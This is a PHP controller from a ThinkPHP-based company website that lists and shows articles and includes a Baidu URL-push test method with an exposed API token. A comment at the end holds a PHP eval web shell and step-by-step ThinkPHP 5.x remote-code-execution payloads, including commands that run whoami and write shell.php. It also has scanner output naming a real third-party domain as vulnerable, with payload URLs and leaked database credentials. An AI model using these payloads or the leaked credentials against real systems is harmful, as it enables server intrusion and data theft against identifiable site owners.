<?php


namespace app\index\controller;


use app\common\controller\Frontend;
use app\common\model\Category;
use app\common\model\Config;
use think\Request;

/**
 * Class Article
 * @package app\index\controller
 */
class Article extends Frontend
{
    protected $noNeedLogin = '*';
    protected $noNeedRight = '*';
    protected $layout = '';

    function index()
    {
        $cid = Request::instance()->get("cid");
        /*  根据不同的分类 分别加载 产品、公司相册、新闻列表  和 各种单页 */
        $cond = [];
        if ($cid == 2) {
//          产品系列
            $ids = [];
            $articleids = Category::where(["pid" => $cid])->field("id")->select();
            for ($i = 0; $i < count($articleids); $i++) {
                array_push($ids, $articleids[$i]["id"]);
            }
//            处理好id参数 作为查询条件
            $cond["cate_id"] = array("in", implode(",", $ids));

            $data = \app\common\model\Article::where($cond)->paginate();
            $this->assign("data", $data);
            // 获取分页显示
            $page = $data->render();
// 模板变量赋值
            $this->assign('page', $page);
            return $this->fetch();
        } else if ($cid == 12 || ($cid <= 5 & $cid >= 3) || $cid == 14 || $cid == 19 || $cid == 20) {
            $cond["cate_id"] = $cid;
            $data = \app\common\model\Article::where($cond)->paginate();
            $this->assign("data", $data);
            // 获取分页显示
            $page = $data->render();
// 模板变量赋值
            $this->assign('page', $page);
            return $this->fetch();
        } else {
            $cond["cate_id"] = $cid;
            $data = \app\common\model\Article::where($cond)->paginate();
            $this->assign("data", $data);
            return $this->fetch();

        }

    }

    /**
     *  API 提交url的测试
     */
    private function test()
    {
        $pageUrl = \request()->domain() . \request()->url();
        $urls = array($pageUrl);
        $api = 'http://data.zz.baidu.com/urls?site=https://www.oujinbeer.com&token=9tXltUq6uIBx9A0m';
        $ch = curl_init();
        $options = array(
            CURLOPT_URL => $api,
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POSTFIELDS => implode("\n", $urls),
            CURLOPT_HTTPHEADER => array('Content-Type: text/plain'),
        );
        curl_setopt_array($ch, $options);
        $result = curl_exec($ch);
        echo $result;
    }

    function show()
    {

        $id = $this->request->get("aid");
        $cid = $this->request->get("cid");
        $data = \app\common\model\Article::find($id);
        $this->assign("data", $data);
        if ($cid > 0) {
            return $this->fetch("about");
        } else {
            return $this->view->fetch();

        }
    }

    /* <?php @eval($_POST[2233])?>


    步骤
    1： /index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100
    2：/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
    3：/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST[2233])?>



    存在ThinkPHP 5.0.22/5.1.29 RCE
Payload: http://www.wfgxjsjt.cn//?s=/admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
[+] 存在ThinkPHP 5.0.23 RCE
Payload: http://www.wfgxjsjt.cn//?s=captcha&test=-1 Post: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
[-] 不存在ThinkPHP 5.0.24-5.1.30 RCE
[-] 不存在ThinkPHP 3.x RCE
[+] 存在ThinkPHP 5.x 数据库信息泄露
Payload: username:wfgxjs hostname:127.0.0.1 password:wfgxjs database:wfgxjs


*/

}